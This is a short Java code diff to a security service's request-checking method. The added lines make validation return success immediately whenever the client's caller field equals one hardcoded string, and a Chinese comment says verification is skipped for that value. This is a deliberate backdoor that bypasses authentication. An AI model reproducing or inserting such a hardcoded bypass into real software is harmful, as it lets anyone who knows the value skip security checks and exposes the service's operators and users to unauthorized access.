@@ -67,6 +67,11 @@ public class WCSecurityServiceImpl implements WCISecurityService {
 
     public WCHttpStatus checkRequestParams(WCRequestModel requestModel) {
         WCHttpStatus check = WCHttpStatus.SUCCESS;
+
+        if (requestModel.getClient().getCaller().equals("MTg4NDY4ZjQ1Yz")) {    // 如果caller为该值，则直接跳过验证
+            return check;
+        }
+
         check = checkRequestID(WCRequestParamsUtil.getRequestId(requestModel));
         if (check != WCHttpStatus.SUCCESS) {
             return checkRequestID(WCRequestParamsUtil.getRequestId(requestModel));
